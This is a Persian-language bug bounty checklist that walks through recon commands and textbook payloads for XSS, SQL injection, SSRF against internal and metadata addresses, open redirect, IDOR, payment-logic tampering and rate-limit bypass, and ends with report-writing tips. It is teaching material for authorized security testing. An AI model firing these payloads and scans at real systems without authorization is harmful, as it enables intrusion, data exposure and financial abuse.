این چک لیست برای هانترهای باگ بانتی طراحی شده است تا با تمرکز بر باگ‌های فنی و منطقی با پاداش بالا (2500 تا 50000 دلار)، در کمترین زمان (1-2 ساعت) به آسیب‌پذیری‌ها برسند و گزارش سریع در پلتفرم‌هایی مانند HackerOne، Bugcrowd یا YesWeHack ارائه کنند. مثال‌های واقعی از گزارش‌های 2025 (بر اساس منابع Infosec Write-ups، Medium و YesWeHack) و پارامترها/URLهای کلیدی آورده شده است.

مثال‌های خاص از باگ‌های پردرآمد در 2025
1. IDOR (Insecure Direct Object Reference)

پاداش: 2000-10000 دلار
مثال واقعی (Infosec Write-ups, 2025):
هانتر با تغییر user_id در API پروفایل، به اطلاعات کاربران دیگر دسترسی پیدا کرد.
URL: /api/v1/user/profile?user_id=123
پارامتر: user_id
تست: تغییر user_id=123 به user_id=124 برای دسترسی غیرمجاز.
تأثیر: افشای اطلاعات حساس (PII) مانند ایمیل و آدرس.
چرا پردرآمد؟: باگ P1، تأثیر مستقیم بر حریم خصوصی.



۲. XSS (Cross-Site Scripting)

پاداش: 1000-5000 دلار (تا 10000 دلار برای موارد حساس)
مثال واقعی (Medium, 2025):
Reflected XSS در subdomain فراموش‌شده با تزریق <script>alert(1)</script> در پارامتر جستجو.
URL: /search?q=<script>alert(1)</script>
پارامتر: q, search
تست: تزریق payloadهای ساده مانند <img src=x onerror=alert(1)>.
تأثیر: سرقت کوکی یا جلسه کاربر.
چرا پردرآمد؟: رایج و قابل زنجیره شدن با باگ‌های دیگر.



۳. SQL Injection

پاداش: 5000-20000 دلار (تا 50000 یورو برای موارد بحرانی)
مثال واقعی (YesWeHack, 2025):
SQLi در فرم لاگین با تزریق ' OR '1'='1 در فیلد username.
URL: /login?username=' OR '1'='1 --&password=anything
پارامتر: username, id
تست: استفاده از SQLmap یا تزریق دستی برای استخراج داده.
تأثیر: دسترسی به پایگاه داده و افشای اطلاعات حساس.
چرا پردرآمد؟: در OWASP Top 10، تأثیر مستقیم بر داده‌ها.



۴. Business Logic Flaws (نقص‌های منطقی کسب‌وکار)

پاداش: 5000-50000 دلار
مثال واقعی (Infosec Write-ups, 2025):
دستکاری quantity به مقدار منفی در سیستم پرداخت، منجر به افزایش اعتبار حساب.
URL: /api/cart/update?item_id=456&quantity=-1
پارامتر: quantity, price, amount
تست: تغییر مقادیر به منفی یا صفر برای دور زدن منطق پرداخت.
تأثیر: ضرر مالی مستقیم (مثل بازپرداخت غیرمجاز).
چرا پردرآمد؟: نیاز به خلاقیت، اغلب زنجیره‌ای با IDOR.



۵. SSRF (Server-Side Request Forgery)

پاداش: 5000-10000 دلار
مثال واقعی (LinkedIn, 2025):
دسترسی به سرورهای داخلی با تغییر پارامتر url.
URL: /fetch?url=http://internal-server
پارامتر: url
تست: تزریق آدرس‌های داخلی مانند http://localhost یا http://169.254.169.254.
تأثیر: دسترسی به منابع داخلی یا ابرداده (metadata).



۶. Open Redirect

پاداش: 1000-3000 دلار
مثال واقعی (2025):
دستکاری redirect_uri در OAuth flow.
URL: /oauth?redirect_uri=evil.com
پارامتر: redirect_uri, next
تست: تغییر به دامنه خارجی برای ریدایرکت غیرمجاز.
تأثیر: فیشینگ یا سرقت توکن.




چک لیست گام‌به‌گام برای باگ بانتی (زمان: ۱-۲ ساعت)
گام ۱: Recon (کشف دارایی‌ها - ۱۰-۲۰ دقیقه)

هدف: شناسایی دامنه‌ها، URLها و پارامترهای کلیدی.
اقدامات:
دامنه برنامه را از robots.txt و sitemap.xml بررسی کنید.
subdomainها را با Subfinder یا Amass پیدا کنید:subfinder -d target.com -o subdomains.txt


URLهای قدیمی را با Waybackurls یا Katana جمع‌آوری کنید:waybackurls target.com > urls.txt


پارامترهای مخفی را با Arjun پیدا کنید:arjun -u https://target.com/api -m GET


فایل‌های حساس را چک کنید: /.env, /.git, /backup.sql, /config.json.
API endpoints را شناسایی کنید: /api/v1/, /graphql, /rest.



گام ۲: تست آسیب‌پذیری‌های فنی (۲۰-۳۰ دقیقه)

هدف: کشف سریع باگ‌های فنی با تأثیر بالا.
اقدامات:
XSS:
پارامترهای q, search, keyword را با payloadهای زیر تست کنید:<script>alert(1)</script>
<img src=x onerror=alert(1)>


ابزار: DOM Invader یا Burp Suite.


SQL Injection:
پارامترهای id, username را با ' OR '1'='1 یا ' UNION SELECT 1,2,3 -- تست کنید.
ابزار: SQLmap:sqlmap -u "https://target.com/login?username=test" --batch




IDOR:
مقادیر user_id, id را تغییر دهید (مثل id=123 به id=124).
چک کنید: آیا اطلاعات کاربر دیگر نمایش داده می‌شود؟


SSRF:
پارامترهای url, endpoint را با آدرس‌های داخلی تست کنید:http://localhost
http://169.254.169.254




Open Redirect:
پارامترهای redirect, next را با evil.com تست کنید.


ابزار پیشنهادی: Nuclei برای اسکن خودکار:nuclei -u https://target.com -t cves/





گام ۳: تست باگ‌های منطقی (۱۵-۲۵ دقیقه)

هدف: کشف نقص‌های منطقی با تأثیر مالی یا دسترسی غیرمجاز.
اقدامات:
دستکاری پرداخت:
پارامترهای quantity, price را به مقادیر منفی یا صفر تغییر دهید:curl -X POST https://target.com/api/cart -d "quantity=-1"


چک کنید: آیا اعتبار حساب افزایش می‌یابد؟


Privilege Escalation:
پارامتر role یا access را از user به admin تغییر دهید.
تست: آیا دسترسی به پنل مدیریت ممکن است؟


Rate Limiting Bypass:
درخواست‌های مکرر برای OTP یا فرم لاگین ارسال کنید:while true; do curl https://target.com/otp; done


چک کنید: آیا محدودیت دور زده می‌شود؟


زنجیره‌سازی:
IDOR را با Logic Flaw ترکیب کنید (مثل دسترسی به سبد خرید کاربر دیگر).
ابزار: Burp Suite Repeater برای تست دستی.





گام ۴: تأیید و گزارش سریع (۱۰-۱۵ دقیقه)

هدف: نوشتن گزارش واضح و حرفه‌ای برای پاداش بالا.
اقدامات:
تأیید تأثیر:
آیا داده حساس افشا می‌شود؟ ضرر مالی دارد؟ (P1/P2 اولویت دارند).


نوشتن گزارش:
عنوان: واضح و مختصر (مثل "IDOR in User API Leading to PII Leak").
مراحل تکرار (PoC): URL، پارامتر، payload و مراحل دقیق.
تأثیر: توضیح تأثیر واقعی (مثل افشای داده یا ضرر مالی).
پیشنهاد رفع: راه‌حل پیشنهادی (مثل اعتبارسنجی ورودی).


از قالب پلتفرم (HackerOne، Bugcrowd) استفاده کنید.
اگر باگ زنجیره‌ای است، آن را برجسته کنید.
زمان کل: کمتر از ۱ ساعت برای کشف + گزارش.




نکات برای موفقیت و پاداش بالا

روی برنامه‌های جدید یا با دامنه وسیع تمرکز کنید (مثل NCS Public Bug Bounty).
از ابزارهای کم‌تلاش مانند DOM Invader برای XSS استفاده کنید.
گزارش‌های اولیه را با باگ‌های کم‌ریسک (مانند Open Redirect) شروع کنید.
منابع اضافی:
OWASP Top 10 برای باگ‌های فنی.
GitHub Bug-bounty-Writeups برای مثال‌های واقعی.
Nahamsec Recon Checklist برای بهبود کشف.


============================================================================
